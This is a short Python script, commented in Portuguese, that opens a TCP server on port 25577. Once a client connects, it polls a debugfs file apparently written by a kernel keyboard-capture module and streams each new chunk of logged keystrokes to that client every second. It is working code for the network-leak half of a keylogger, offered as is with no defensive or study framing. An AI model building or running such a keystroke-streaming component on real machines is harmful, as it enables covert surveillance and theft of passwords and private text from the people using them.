import socket
import time

HOST = 'localhost'  # Endereço IP ou nome do host do servidor
PORT = 25577  # Porta do servidor

# Cria um socket TCP/IP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Define a opção SO_REUSEADDR
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Associa o socket à porta e endereço
s.bind((HOST, PORT))

# Coloca o socket em modo de escuta
s.listen(1)

print(f"Servidor escutando em {HOST}:{PORT}")

# Aguarda a conexão de um cliente
conn, addr = s.accept()
print(f"Conexão estabelecida com {addr}")

# Função para enviar as atualizações do log para o cliente
def send_log_updates():
    log_path = '/sys/kernel/debug/keyboard_module/log'
    last_size = 0  # Tamanho do log lido na última iteração

    while True:
        with open(log_path, 'r', encoding='latin1') as log_file:
            # Obtém o tamanho atual do log
            log_data = log_file.read()
            current_size = len(log_data)

            # Verifica se há novas atualizações do log
            if current_size > last_size:
                new_data = log_data[last_size:]
                data = new_data.encode()
                conn.sendall(data)
                print("Log enviado:", new_data.strip())

            # Atualiza o tamanho do log lido
            last_size = current_size

        # Aguarda 1 segundo antes de ler novamente o arquivo de log
        time.sleep(1)

# Inicia o envio das atualizações do log
send_log_updates()

# Encerra a conexão com o cliente
conn.close()
print("Conexão encerrada")

